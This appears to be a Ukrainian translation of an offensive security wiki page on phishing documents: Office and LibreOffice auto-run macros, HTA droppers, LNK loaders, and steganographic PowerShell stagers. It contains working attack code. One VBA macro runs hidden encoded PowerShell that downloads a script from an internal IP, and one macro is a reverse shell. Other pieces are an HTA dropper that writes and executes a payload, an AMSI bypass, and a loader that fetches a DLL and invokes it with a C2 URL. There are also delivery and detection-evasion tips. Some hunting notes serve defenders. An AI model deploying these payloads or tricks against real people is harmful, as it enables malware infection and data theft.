# Фішингові файли та документи

## Документи Office

Microsoft Word виконує перевірку даних файлу перед його відкриттям. Перевірка даних здійснюється у формі ідентифікації структури даних відповідно до стандарту OfficeOpenXML. Якщо під час ідентифікації структури даних виникає помилка, файл, що аналізується, не буде відкрито.

Зазвичай файли Word, що містять макроси, використовують розширення `.docm`. Однак файл можна перейменувати, змінивши розширення, і при цьому зберегти можливість виконання макросів.\
Наприклад, файл RTF за задумом не підтримує макроси, але файл DOCM, перейменований на RTF, буде оброблений Microsoft Word і зможе виконувати макроси.\
Ті самі внутрішні компоненти та механізми застосовуються до всього програмного забезпечення Microsoft Office Suite (Excel, PowerPoint тощо).

Ви можете використати наведену нижче команду, щоб перевірити, які розширення виконуватимуться деякими програмами Office:
```bash
assoc | findstr /i "word excel powerp"
```
DOCX-файли, що посилаються на віддалений шаблон (File –Options –Add-ins –Manage: Templates –Go), який містить macros, також можуть «виконувати» macros.

### Завантаження зовнішнього зображення

Перейдіть до: _Insert --> Quick Parts --> Field_\
_**Categories**: Links and References, **Filed names**: includePicture, і **Filename or URL**:_ http://<ip>/whatever

![Office Documents - Завантаження зовнішнього зображення: Перейдіть до: Insert -- Quick Parts -- Field](<../../images/image (155).png>)

### Backdoor через macros

За допомогою macros можна запускати довільний code з документа.

#### Функції автозавантаження

Що частіше вони використовуються, то ймовірніше, що AV їх виявить.

- AutoOpen()
- Document_Open()

#### Приклади коду macros
```vba
Sub AutoOpen()
CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

Dim Shell As Object
Set Shell = CreateObject("wscript.shell")
Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
.StdIn.WriteLine author
.StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```
#### Вручну видаліть метадані

Перейдіть до **File > Info > Inspect Document > Inspect Document**, щоб відкрити Document Inspector. Натисніть **Inspect**, а потім **Remove All** поруч із **Document Properties and Personal Information**.

#### Розширення документа

Після завершення виберіть спадний список **Save as type** і змініть формат із **`.docx`** на **Word 97-2003 `.doc`**.\
Зробіть це тому, що **неможливо зберігати macro всередині `.docx`**, а навколо macro-enabled розширення **`.docm`** існує **стигма** (наприклад, на значку ескізу є великий `!`, а деякі web/email gateway повністю блокують такі файли). Тому це **legacy-розширення `.doc` є найкращим компромісом**.

#### Генератори шкідливих макросів

- MacOS
- [**macphish**](https://github.com/cldrn/macphish)
- [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## Auto-run макроси LibreOffice ODT (Basic)

Документи LibreOffice Writer можуть містити Basic макроси та автоматично виконувати їх під час відкриття файлу, прив’язавши macro до події **Open Document** (Tools → Customize → Events → Open Document → Macro…).<sup>[[1]](#references)</sup> Простий reverse shell macro виглядає так:
```vb
Sub Shell
Shell("cmd /c powershell -enc BASE64_PAYLOAD"""")
End Sub
```
Зверніть увагу на подвоєні лапки (`""`) усередині рядка — LibreOffice Basic використовує їх для екранування літеральних лапок, тому payload-и, що закінчуються на `...==""")`, зберігають збалансованими і внутрішню команду, і аргумент Shell.

Поради щодо доставки:

- Збережіть файл як `.odt` і прив’яжіть macro до події документа, щоб він запускався одразу після відкриття.
- Під час надсилання через `swaks` використовуйте `--attach @resume.odt` (`@` обов’язковий, щоб як вкладення надсилалися байти файлу, а не рядок із назвою файлу). Це критично під час зловживання SMTP-серверами, які приймають довільних отримувачів `RCPT TO` без перевірки.

## HTA Файли

HTA — це програма для Windows, яка **поєднує HTML і scripting languages (такі як VBScript і JScript)**. Вона генерує інтерфейс користувача та виконується як застосунок із "повною довірою", без обмежень security model браузера.

HTA виконується за допомогою **`mshta.exe`**, який зазвичай **встановлюється** разом з **Internet Explorer**, через що **`mshta` залежить від IE**. Тому якщо його було видалено, HTA не зможуть виконуватися.
```html
<--! Basic HTA Execution -->
<html>
<head>
<title>Hello World</title>
</head>
<body>
<h2>Hello World</h2>
<p>This is an HTA...</p>
</body>

<script language="VBScript">
Function Pwn()
Set shell = CreateObject("wscript.Shell")
shell.run "calc"
End Function

Pwn
</script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
Function var_func()
var_shellcode = "<shellcode>"

Dim var_obj
Set var_obj = CreateObject("Scripting.FileSystemObject")
Dim var_stream
Dim var_tempdir
Dim var_tempexe
Dim var_basedir
Set var_tempdir = var_obj.GetSpecialFolder(2)
var_basedir = var_tempdir & "\" & var_obj.GetTempName()
var_obj.CreateFolder(var_basedir)
var_tempexe = var_basedir & "\" & "evil.exe"
Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
For i = 1 to Len(var_shellcode) Step 2
var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
Next
var_stream.Close
Dim var_shell
Set var_shell = CreateObject("Wscript.Shell")
var_shell.run var_tempexe, 0, true
var_obj.DeleteFile(var_tempexe)
var_obj.DeleteFolder(var_basedir)
End Function

var_func
self.close
</script>
```
## Примусова NTLM-аутентифікація

Існує кілька способів **віддалено примусити NTLM-аутентифікацію**, наприклад можна додати **невидимі зображення** до електронних листів або HTML, які відкриє користувач (навіть HTTP MitM?). Або надіслати жертві **адресу файлів**, яка **ініціює** **аутентифікацію** лише під час **відкриття папки**.

**Перевірте ці та інші ідеї на таких сторінках:**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

Не забувайте, що можна не лише викрасти хеш або дані аутентифікації, а й **виконувати атаки NTLM relay**:

- [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK Loaders + ZIP-Embedded Payloads (fileless chain)

Високоефективні кампанії доставляють ZIP-архів, що містить два легітимні документи-приманки (PDF/DOCX) і шкідливий .lnk. Суть полягає в тому, що фактичний PowerShell loader зберігається в raw bytes ZIP-архіву після унікального маркера, а .lnk вилучає його та запускає повністю в пам’яті.<sup>[[2]](#references)</sup>

Типовий flow, реалізований за допомогою PowerShell one-liner у .lnk:

1) Знайти оригінальний ZIP у поширених шляхах: Desktop, Downloads, Documents, %TEMP%, %ProgramData% і батьківській директорії поточного робочого каталогу.
2) Прочитати байти ZIP-архіву та знайти hardcoded marker (наприклад, xFIQCV). Усе після маркера є вбудованим PowerShell payload.
3) Скопіювати ZIP до %ProgramData%, розпакувати його там і відкрити .docx-приманку, щоб створити вигляд легітимного документа.
4) Обійти AMSI для поточного процесу: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) Деобфускувати наступний stage (наприклад, видалити всі символи #) і виконати його в пам’яті.

Приклад PowerShell skeleton для вилучення та запуску вбудованого stage:
```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
"$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
"$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```
Нотатки
- Доставка часто зловживає субдоменами надійних PaaS (наприклад, *.herokuapp.com) і може фільтрувати payloads (подавати нешкідливі ZIP залежно від IP/UA).
- Наступний етап часто розшифровує base64/XOR shellcode і виконує його через Reflection.Emit + VirtualAlloc, щоб мінімізувати артефакти на диску.

Persistence, що використовується в тому самому ланцюжку
- COM TypeLib hijacking елемента керування Microsoft Web Browser, завдяки якому IE/Explorer або будь-який застосунок, що його вбудовує, автоматично повторно запускає payload.<sup>[[2]](#references)[[4]](#references)</sup> Деталі та готові до використання команди наведено тут:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Пошук/IOC
- ZIP-файли, що містять ASCII-маркер (наприклад, xFIQCV), доданий до даних архіву.
- .lnk, який перебирає батьківські папки та папки користувача, щоб знайти ZIP, і відкриває decoy-документ.
- AMSI tampering через [System.Management.Automation.AmsiUtils]::amsiInitFailed.
- Тривалі бізнес-потоки, що завершуються посиланнями, розміщеними в надійних PaaS-доменах.

## LNK staging із пріоритетом decoy → persistence через scheduled task → side-loading довіреного CPL

Інший поширений шаблон — **document-impersonating `.lnk`**, який негайно відкриває нешкідливий lure, одночасно готуючи справжній ланцюжок у фоновому режимі.<sup>[[3]](#references)</sup>

Спостережуваний workflow:
1. Ярлик **маскується під PDF** і використовує `conhost.exe` або подібний proxy для запуску obfuscated PowerShell downloader.
2. PowerShell фрагментує очевидні токени (`iw''r`, `g''c''i`, `r''e''n`, `c''p''i`, `&(g''cm sch*)`), тому наївні detections, що шукають `iwr`, `gci`, `ren`, `cpi` або `schtasks`, не виявляють команду.
3. Stager спочатку завантажує **decoy-документ**, відкриває його для victim, а потім відновлює шкідливі файли у фоновому режимі.
4. Payloads можуть записуватися з **непотрібними розширеннями**, а потім перейменовуватися шляхом видалення символів-заповнювачів, що затримує появу очевидних артефактів `.exe` / `.cpl`.
5. Persistence встановлюється за допомогою **scheduled task із запуском щохвилини**, який запускає довірений host binary із доступного для запису користувачем шляху.

Мінімальні підказки для hunting за цим шаблоном:
```powershell
# Suspicious split-token PowerShell seen in LNK chains
iw''r
r''e''n
&(g''cm sch*) /create /Sc minute /tn GoogleErrorReport /tr "$env:PUBLIC\Fondue"
```
Корисна структура staging, яку варто розпізнавати:
- `C:\Users\Public\<decoy>.pdf`
- `C:\Users\Public\<trusted>.exe`
- `C:\Users\Public\<malicious>.cpl` або `.dll`
- `C:\Windows\Tasks\<blob>.dat`

### Чому друга стадія є непомітною

У case study Rapid7 scheduled task неодноразово запускав **`Fondue.exe`** з `C:\Users\Public\`. Оскільки **`APPWIZ.cpl`** був розміщений поруч і експортував **`RunFODW`**, довірений бінарний файл Microsoft виконував side-loading CPL атакувальника замість легітимної системної копії.

Потім CPL:
- Читає blob **AES-256-CBC** з `C:\Windows\Tasks\editor.dat`
- Розшифровує його через **Windows CNG / `bcrypt.dll`**
- Виділяє executable memory і копіює туди розшифрований shellcode
- Виконує його опосередковано, передаючи pointer на shellcode як callback для **`EnumUILanguagesW`**

Останній крок варто шукати окремо: malware часто уникає прямого переходу `((void(*)())buf)()` і натомість зловживає **легітимним WinAPI, який приймає callback**, щоб передати виконання.

Розшифрованим payload у цій кампанії був shellcode **Donut**, який потім повністю відображав фінальний PE у memory і патчив **AMSI/WLDP/ETW** у поточному процесі перед передачею виконання. Докладніші нотатки щодо side-loading і memory-resident post-processing дивіться тут:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/dll-hijacking/README.md
{{#endref}}

{{#ref}}
../../windows-hardening/av-bypass.md
{{#endref}}

Практичні pivots для hunting:
- `.lnk`, що запускає `powershell.exe` або `conhost.exe`, після чого відкривається видимий decoy-документ.
- Короткочасні downloads до **`C:\Users\Public\`**, після яких одразу виконуються перейменування з nonsense-розширень.
- Scheduled tasks із непомітними назвами, такими як `GoogleErrorReport`, що виконуються з **директорій, доступних для запису користувачем**.
- Довірені бінарні файли, що завантажують **`.cpl` / `.dll`** із тієї самої несистемної директорії.
- Base64 text blobs, записані в **`C:\Windows\Tasks\`**, а потім прочитані side-loaded module.

## Payloads, розділені steganography-маркерами, у зображеннях (PowerShell stager)

Сучасні loader chains доставляють obfuscated JavaScript/VBS, який декодує та запускає Base64 PowerShell stager. Цей stager завантажує зображення (часто GIF), що містить Base64-encoded .NET DLL, прихований як plain text між унікальними start/end markers. Скрипт шукає ці delimiters (приклади, помічені in the wild: «<<sudo_png>> … <<sudo_odt>>>»), витягує текст між ними, Base64-декодує його в bytes, завантажує assembly у memory та викликає відомий entry method із C2 URL.<sup>[[5]](#references)</sup>

Робочий процес
- Stage 1: Archived JS/VBS dropper → декодує embedded Base64 → запускає PowerShell stager з -nop -w hidden -ep bypass.
- Stage 2: PowerShell stager → завантажує image, витягує marker-delimited Base64, завантажує .NET DLL у memory та викликає її method (наприклад, VAI), передаючи C2 URL і options.
- Stage 3: Loader отримує final payload і зазвичай інжектить його через process hollowing у trusted binary (зазвичай MSBuild.exe).<sup>[[7]](#references)[[8]](#references)</sup> Докладніше про process hollowing і trusted utility proxy execution дивіться тут:

{{#ref}}
../../reversing/common-api-used-in-malware.md
{{#endref}}

Приклад PowerShell для витягування DLL із зображення та виклику .NET method у memory:

<details>
<summary>PowerShell extractor і loader stego payload</summary>
```powershell
# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
param(
[string]$Url    = 'https://example.com/payload.gif',
[string]$StartM = '<<sudo_png>>',
[string]$EndM   = '<<sudo_odt>>',
[string]$EntryType = 'Loader',
[string]$EntryMeth = 'VAI',
[string]$C2    = 'https://c2.example/payload'
)
$img = (New-Object Net.WebClient).DownloadString($Url)
$start = $img.IndexOf($StartM)
$end   = $img.IndexOf($EndM)
if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
$type = $asm.GetType($EntryType)
$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
```
</details>

Примітки
- Це ATT&CK T1027.003 (steganography/marker-hiding).<sup>[[6]](#references)</sup> Маркери відрізняються залежно від кампанії.
- AMSI/ETW bypass і string deobfuscation зазвичай застосовуються перед завантаженням assembly.
- Пошук: сканувати завантажені зображення на наявність відомих роздільників; виявляти PowerShell, який звертається до зображень і одразу декодує Base64 blobs.

Також див. stego tools і carving techniques:

{{#ref}}
../../stego/workflow/README.md#quick-triage-checklist-first-10-minutes
{{#endref}}

## JS/VBS droppers → Base64 PowerShell staging

Поширеним початковим етапом є невеликий, сильно obfuscated `.js` або `.vbs`, доставлений усередині архіву. Його єдина мета — декодувати вбудований Base64 string і запустити PowerShell з параметрами `-nop -w hidden -ep bypass`, щоб ініціалізувати наступний етап через HTTPS.<sup>[[5]](#references)</sup>

Skeleton logic (abstract):
- Прочитати вміст власного файлу
- Знайти Base64 blob між junk strings
- Декодувати в ASCII PowerShell
- Виконати за допомогою `wscript.exe`/`cscript.exe`, викликаючи `powershell.exe`

Ознаки для пошуку
- Архівні JS/VBS-вкладення, що запускають `powershell.exe` з `-enc`/`FromBase64String` у командному рядку.
- `wscript.exe`, який запускає `powershell.exe -nop -w hidden` із тимчасових шляхів користувача.

## Windows files to steal NTLM hashes

Перевірте сторінку про **місця для викрадення NTLM creds**:

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}


## References

- [1] [HTB Job – макрос LibreOffice → IIS webshell → GodPotato](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [2] [Check Point Research – кампанія ZipLine: складна phishing-атака, спрямована на компанії США](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [3] [Rapid7 – Malware à la Mode: відстеження tradecraft Dropping Elephant у ланцюжку loader із тематикою Китаю](https://www.rapid7.com/blog/post/tr-malware-tracking-dropping-elephant-tradecraft-china-themed-loader-chain)
- [4] [Hijack the TypeLib – новий метод COM persistence (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [5] [Unit 42 – loader PhantomVAI доставляє низку infostealers](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [6] [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
- [7] [MITRE ATT&CK – Process Hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
- [8] [MITRE ATT&CK – Trusted Developer Utilities Proxy Execution: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)
{{#include ../../banners/hacktricks-training.md}}
